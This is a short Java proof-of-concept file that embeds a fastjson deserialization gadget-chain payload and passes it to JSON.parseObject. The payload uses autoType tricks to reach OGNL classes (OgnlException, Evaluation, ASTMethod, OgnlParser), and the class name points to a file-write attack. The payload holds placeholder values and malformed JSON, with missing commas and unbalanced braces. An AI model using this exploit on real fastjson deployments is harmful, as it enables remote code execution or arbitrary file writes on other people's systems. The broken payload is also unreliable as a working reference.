import com.alibaba.fastjson.JSON;

public class OgnlCommonsIO_FileWriter
{
	private static String poc = "" +
		"{\"x\": \n" +
		"    [\n" +
		"        {\n" +
		"            \"@type\":\"java.lang.Exception\",\n" +
		"            \"@type\":\"ognl.OgnlException\",\n" +
		"        },{\n" +
		"            \"@type\":\"java.lang.Class\",\n" +
		"            \"val\":{\n" +
		"                \"@type\":\"com.alibaba.fastjson.JSONObject\",{\n" +
		"                \"@type\":\"java.lang.String\"\n" +
		"                \"@type\":\"ognl.OgnlException\",\n" +
		"                \"_evaluation\":\"abcdefg\"\n" +
		"            }\n" +
		"        },{\n" +
		"            \"@type\": \"ognl.Evaluation\",\n" +
		"            \"node\": {\n" +
		"                \"@type\": \"ognl.ASTMethod\",\n" +
		"                \"p\": {\n" +
		"                    \"@type\": \"ognl.OgnlParser\",\n" +
		"                    \"stream\":\"abcdefg\"\n" +
		"                }\n" +
		"            }\n" +
		"     ]\n" +
		"}";

	public static void main( String[] args ) {
		System.out.println(poc);
		JSON.parseObject(poc);
	}
}
